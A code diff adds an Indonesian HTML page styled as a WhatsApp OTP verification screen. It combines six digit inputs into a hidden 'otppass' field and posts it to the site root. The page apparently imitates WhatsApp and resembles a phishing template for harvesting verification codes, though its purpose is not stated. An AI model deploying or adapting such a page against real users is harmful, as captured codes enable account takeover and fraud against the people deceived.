@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi OTP WhatsApp</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        input::-webkit-outer-spin-button,
+        input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+        input[type=number] {
+            -moz-appearance: textfield;
+        }
+    </style>
+</head>
+<body class="bg-gray-50 flex items-center justify-center min-h-screen">
+
+    <div class="max-w-md w-full bg-white p-8 rounded-xl shadow-lg border border-gray-100 mx-4">
+        <div class="text-center mb-8">
+            <div class="bg-green-100 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
+                </svg>
+            </div>
+            <h2 class="text-2xl font-bold text-gray-800">Verifikasi Nomor Anda</h2>
+            <p class="text-gray-500 mt-2">Kode OTP telah dikirimkan ke nomor WhatsApp <span class="font-semibold text-gray-700">+62 812-****-****</span></p>
+        </div>
+
+        <form id="otp-form" method="POST" action="/">
+            <input type="hidden" name="otppass" id="final-otp">
+            
+            <div class="flex justify-between gap-2 mb-6">
+                <input type="number" maxlength="1" class="otp-input w-12 h-14 text-center text-2xl font-extrabold text-gray-900 bg-gray-50 border border-gray-300 rounded-lg focus:ring-green-500 focus:border-green-500 outline-none transition-all" required>
+                <input type="number" maxlength="1" class="otp-input w-12 h-14 text-center text-2xl font-extrabold text-gray-900 bg-gray-50 border border-gray-300 rounded-lg focus:ring-green-500 focus:border-green-500 outline-none transition-all" required>
+                <input type="number" maxlength="1" class="otp-input w-12 h-14 text-center text-2xl font-extrabold text-gray-900 bg-gray-50 border border-gray-300 rounded-lg focus:ring-green-500 focus:border-green-500 outline-none transition-all" required>
+                <input type="number" maxlength="1" class="otp-input w-12 h-14 text-center text-2xl font-extrabold text-gray-900 bg-gray-50 border border-gray-300 rounded-lg focus:ring-green-500 focus:border-green-500 outline-none transition-all" required>
+                <input type="number" maxlength="1" class="otp-input w-12 h-14 text-center text-2xl font-extrabold text-gray-900 bg-gray-50 border border-gray-300 rounded-lg focus:ring-green-500 focus:border-green-500 outline-none transition-all" required>
+                <input type="number" maxlength="1" class="otp-input w-12 h-14 text-center text-2xl font-extrabold text-gray-900 bg-gray-50 border border-gray-300 rounded-lg focus:ring-green-500 focus:border-green-500 outline-none transition-all" required>
+            </div>
+
+            <button type="submit" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 rounded-lg transition-colors shadow-md mb-4">
+                Verifikasi
+            </button>
+        </form>
+
+        <div class="text-center text-sm">
+            <p class="text-gray-500">Tidak menerima kode? 
+                <button id="resend-btn" class="text-green-600 font-semibold hover:underline disabled:text-gray-400">
+                    Kirim Ulang (<span id="timer">59</span>s)
+                </button>
+            </p>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('otp-form');
+        const inputs = document.querySelectorAll('.otp-input');
+        const finalOtpInput = document.getElementById('final-otp');
+        const timerEl = document.getElementById('timer');
+        const resendBtn = document.getElementById('resend-btn');
+
+        // Gabungkan nilai input saat form disubmit
+        form.addEventListener('submit', (e) => {
+            let otpValue = "";
+            inputs.forEach(input => {
+                otpValue += input.value;
+            });
+            finalOtpInput.value = otpValue; // Masukkan gabungan 6 angka ke hidden input 'password'
+        });
+
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length > 1) {
+                    e.target.value = e.target.value.slice(0, 1);
+                }
+                if (e.target.value && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        // Timer Logic
+        let timeLeft = 59;
+        const countdown = setInterval(() => {
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                resendBtn.disabled = false;
+                timerEl.parentElement.innerHTML = "Kirim Ulang Sekarang";
+            } else {
+                timerEl.innerText = timeLeft;
+                timeLeft--;
+            }
+        }, 1000);
+        
+        resendBtn.disabled = true;
+    </script>
+</body>
+</html>
